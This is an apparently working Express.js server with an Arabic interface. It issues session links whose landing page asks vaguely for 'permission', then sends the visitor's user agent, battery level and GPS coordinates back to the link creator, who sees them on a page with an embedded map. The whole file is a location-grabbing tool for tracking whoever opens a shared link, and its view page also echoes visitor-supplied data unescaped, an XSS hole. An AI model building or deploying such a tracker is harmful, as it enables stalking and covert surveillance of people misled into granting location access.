import express from "express"

const app = express()
const PORT = process.env.PORT || 3000

app.use(express.json())

let sessions = {}

/* ===================== */
/* الصفحة الرئيسية */
/* ===================== */

app.get("/", (req, res) => {

res.send(`
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard</title>

<style>
body{
margin:0;
font-family:Arial;
background:#0f172a;
color:white;
text-align:center;
padding:20px;
}

button{
padding:12px 20px;
border:none;
border-radius:8px;
background:#22c55e;
color:white;
cursor:pointer;
}

.box{
background:#1e293b;
padding:20px;
border-radius:12px;
margin-top:20px;
word-break:break-all;
}
</style>

</head>
<body>

<h1>🚀 لوحة التحكم</h1>

<button onclick="create()">إنشاء جلسة</button>

<div id="result"></div>

<script>

function create(){

fetch("/create")
.then(r => r.json())
.then(data => {

document.getElementById("result").innerHTML =
"<div class='box'>رابط الجلسة:<br><br><a style='color:#22c55e' href='"+data.link+"' target='_blank'>"+data.link+"</a></div>"

})

}

</script>

</body>
</html>
`)
})

/* ===================== */
/* إنشاء جلسة */
/* ===================== */

app.get("/create",(req,res)=>{

let id = Math.random().toString(36).substring(2,8)

sessions[id] = {}

res.json({
link: req.protocol + "://" + req.get("host") + "/s/" + id
})

})

/* ===================== */
/* صفحة الإذن */
/* ===================== */

app.get("/s/:id",(req,res)=>{

let id = req.params.id

res.send(`
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Permission</title>
</head>

<body style="background:#0f172a;color:white;text-align:center;padding:40px;font-family:Arial">

<h2>طلب إذن</h2>

<p>نحتاج موافقتك لمشاركة معلومات الجهاز والموقع.</p>

<button onclick="send()" 
style="padding:12px 20px;border:none;border-radius:8px;background:#22c55e;color:white;cursor:pointer;">
موافق
</button>

<p id="status"></p>

<script>

function send(){

document.getElementById("status").innerText = "جاري جمع البيانات..."

let device = navigator.userAgent
let battery = "غير مدعوم"

function sendData(lat, lon){

fetch("/collect",{
method:"POST",
headers:{ "Content-Type":"application/json"},
body:JSON.stringify({
id:"${id}",
device:device,
battery:battery,
lat:lat,
lon:lon,
time:new Date().toLocaleString()
})
})
.then(()=>{
document.body.innerHTML="<h2>تم الإرسال بنجاح ✅</h2>"
})

}

/* ===== البطارية ===== */

if(navigator.getBattery){

navigator.getBattery().then(function(b){
battery = b.level * 100

/* ===== الموقع ===== */

if(navigator.geolocation){

navigator.geolocation.getCurrentPosition(function(pos){

sendData(pos.coords.latitude, pos.coords.longitude)

}, function(){

alert("تم رفض إذن الموقع ❌")
sendData("رفض","رفض")

})

}

})

} else {

/* لو البطارية غير مدعومة */

if(navigator.geolocation){

navigator.geolocation.getCurrentPosition(function(pos){

sendData(pos.coords.latitude, pos.coords.longitude)

}, function(){

sendData("رفض","رفض")

})

}

}

}

</script>

</body>
</html>
`)
})

/* ===================== */
/* استقبال البيانات */
/* ===================== */

app.post("/collect",(req,res)=>{

if(!sessions[req.body.id]){
return res.json({error:"جلسة غير موجودة"})
}

sessions[req.body.id] = req.body

res.json({ok:true})

})

/* ===================== */
/* عرض البيانات مع خريطة */
/* ===================== */

app.get("/view/:id",(req,res)=>{

let data = sessions[req.params.id]

if(!data){
return res.send("لا توجد بيانات")
}

res.send(`
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session</title>
</head>

<body style="background:#0f172a;color:white;padding:20px;font-family:Arial">

<h2>📊 معلومات الجلسة</h2>

<div style="background:#1e293b;padding:20px;border-radius:12px;word-break:break-all;">

<p><b>الجهاز:</b><br>${data.device}</p>
<p><b>البطارية:</b> ${data.battery}%</p>
<p><b>الوقت:</b> ${data.time}</p>

<h3>📍 الموقع</h3>

<iframe 
width="100%" 
height="400"
style="border-radius:12px;border:none"
src="https://www.google.com/maps?q=${data.lat},${data.lon}&output=embed">
</iframe>

</div>

</body>
</html>
`)
})

app.listen(PORT,()=>{
console.log("Server Running 🚀")
})
